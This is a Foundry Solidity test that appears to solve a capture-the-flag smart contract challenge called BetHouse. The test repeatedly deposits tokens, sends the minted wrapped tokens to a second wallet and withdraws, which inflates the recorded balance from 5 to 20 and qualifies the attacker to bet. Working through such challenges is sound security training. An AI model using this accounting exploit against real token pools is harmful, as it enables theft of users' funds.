// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {BetHouse, Pool, PoolToken} from "../BetHouse.sol";

contract BetHouseTest is Test {
    BetHouse betHouse;
    Pool pool;
    PoolToken depositToken;
    PoolToken wrappedToken;

    address attacker = makeAddr("attacker");
    address attackerWallet = makeAddr("attackerWallet");

    function setUp() public {
        depositToken = new PoolToken("Deposit Token", "PDT");
        wrappedToken = new PoolToken("wrapped Token", "WT");
        pool = new Pool(address(wrappedToken), address(depositToken));
        betHouse = new BetHouse(address(pool));
        wrappedToken.transferOwnership(address(pool));

        deal(address(depositToken), attacker, 5);
    }
    function test_Challenge34_Passed() public {
        vm.startPrank(attacker);
        depositToken.approve(address(pool), type(uint128).max);
        pool.deposit(5);
        // i can now transfer the minted wrapped tokens 
        wrappedToken.transfer(attackerWallet, 5);
        pool.withdrawAll();
        // reddeposit
        pool.deposit(5);
        wrappedToken.transfer(attackerWallet, 5);
        pool.withdrawAll();
        assertEq(pool.balanceOf(attackerWallet), 10);
        
        pool.deposit(5);
        wrappedToken.transfer(attackerWallet, 5);
        pool.withdrawAll();
        assertEq(pool.balanceOf(attackerWallet), 15);
        
        pool.deposit(5);
        vm.stopPrank();

        vm.prank(attackerWallet);
        wrappedToken.transfer(attacker, 15);
        assertEq(pool.balanceOf(attacker), 20);

        vm.startPrank(attacker);
        pool.lockDeposits();
        betHouse.makeBet(attacker);
        vm.stopPrank();
        assert(betHouse.isBettor(attacker));
    }

}